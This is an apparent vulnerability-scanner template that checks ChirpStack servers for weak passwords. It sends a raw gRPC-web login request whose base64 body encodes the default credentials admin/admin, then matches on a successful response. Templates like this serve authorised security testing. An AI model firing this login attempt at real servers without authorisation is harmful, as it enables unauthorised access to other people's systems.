id: poc-yaml-chirpstack-weak-password
info:
  name: ChirpStack Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password
http:
  - raw:
      - |
        POST /api.InternalService/Login HTTP/1.1
        Host: {{Hostname}}
        Accept: application/grpc-web-text
        Content-Type: application/grpc-web-text

        AAAAAA4KBWFkbWluEgVhZG1pbg==
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "AAAAA"
      - type: word
        part: body
        words:
          - "<"
        negative: true
      - type: word
        part: header
        words:
          - "application/grpc-web-text+proto"
